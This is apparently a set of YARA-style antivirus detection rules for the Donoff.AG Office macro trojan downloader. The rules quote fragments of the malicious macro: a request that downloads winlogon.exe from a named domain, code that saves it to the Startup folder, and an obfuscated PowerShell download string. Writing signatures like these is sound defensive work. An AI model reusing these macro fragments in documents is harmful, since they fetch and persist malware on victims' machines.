
rule TrojanDownloader_O97M_Donoff_AG_MSR{
	meta:
		description = "TrojanDownloader:O97M/Donoff.AG!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,08 00 08 00 04 00 00 "
		
	strings :
		$a_01_0 = {2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 3a 2f 2f 63 6f 72 65 6d 61 69 6c 78 74 35 6d 61 69 6e 6a 73 70 2e 63 6f 6d 2f 77 69 6e 6c 6f 67 6f 6e 2e 65 78 65 22 } //3 .Open "GET", "http://coremailxt5mainjsp.com/winlogon.exe"
		$a_01_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 77 69 6e 6c 6f 67 6f 6e 2e 70 69 66 22 2c 20 32 } //2 .savetofile Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\winlogon.pif", 2
		$a_01_2 = {45 6e 76 69 72 6f 6e 28 22 41 50 50 44 41 54 41 22 29 20 26 20 22 5c 4d 69 63 72 6f 73 6f 66 74 5c 57 69 6e 64 6f 77 73 5c 53 74 61 72 74 20 4d 65 6e 75 5c 50 72 6f 67 72 61 6d 73 5c 53 74 61 72 74 75 70 5c 74 65 73 74 2e 65 78 65 22 } //2 Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\test.exe"
		$a_01_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 69 63 72 6f 73 6f 66 74 2e 58 4d 4c 48 54 54 50 22 29 } //1 = CreateObject("Microsoft.XMLHTTP")
	condition:
		((#a_01_0  & 1)*3+(#a_01_1  & 1)*2+(#a_01_2  & 1)*2+(#a_01_3  & 1)*1) >=8
 
}
rule TrojanDownloader_O97M_Donoff_AG_MSR_2{
	meta:
		description = "TrojanDownloader:O97M/Donoff.AG!MSR,SIGNATURE_TYPE_MACROHSTR_EXT,07 00 07 00 07 00 00 "
		
	strings :
		$a_01_0 = {4d 73 67 20 3d 20 4d 73 67 20 26 20 22 54 6f 74 61 6c 20 43 65 6c 6c 73 3a 20 22 20 26 20 76 62 54 61 62 20 26 20 46 6f 72 6d 61 74 28 4e 75 6d 43 65 6c 6c 73 2c 20 22 23 2c 23 23 23 22 29 } //1 Msg = Msg & "Total Cells: " & vbTab & Format(NumCells, "#,###")
		$a_01_1 = {28 22 6b 6e 6c 2e 32 32 30 32 5f 54 4e 41 54 52 4f 50 4d 49 2f 22 29 } //1 ("knl.2202_TNATROPMI/")
		$a_01_2 = {2e 49 63 6f 6e 4c 6f 63 61 74 69 6f 6e 20 3d 20 22 43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c 4d 69 63 72 6f 73 6f 66 74 5c 44 65 76 69 63 65 20 53 74 61 67 65 5c 54 61 73 6b 5c 7b 30 37 64 65 62 38 35 36 2d 66 63 36 65 2d 34 66 62 39 2d 38 61 64 64 2d 64 38 66 32 63 66 38 37 32 32 63 39 7d 5c 66 6f 6c 64 65 72 2e 69 63 6f 22 } //1 .IconLocation = "C:\ProgramData\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}\folder.ico"
		$a_01_3 = {26 20 22 62 67 42 6c 41 48 51 41 4c 67 42 33 41 47 55 41 59 67 42 6a 41 47 77 41 61 51 42 6c 41 47 34 41 64 41 41 70 41 43 34 41 5a 41 42 76 41 48 63 41 62 67 42 73 41 47 38 41 59 51 42 6b 41 46 4d 41 64 41 42 79 41 47 6b 41 62 67 42 6e 41 43 67 } //1 & "bgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACg
		$a_01_4 = {2e 44 65 73 63 72 69 70 74 69 6f 6e 20 3d 20 22 43 72 65 61 74 65 20 70 65 61 63 65 20 61 6e 64 20 45 6e 6a 6f 79 22 } //1 .Description = "Create peace and Enjoy"
		$a_01_5 = {28 22 74 63 65 6a 62 4f 6d 65 74 73 79 53 65 6c 69 46 2e 67 6e 69 74 70 69 72 63 53 22 29 29 } //1 ("tcejbOmetsySeliF.gnitpircS"))
		$a_01_6 = {3d 20 22 70 6f 77 65 22 } //1 = "powe"
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1+(#a_01_6  & 1)*1) >=7
 
}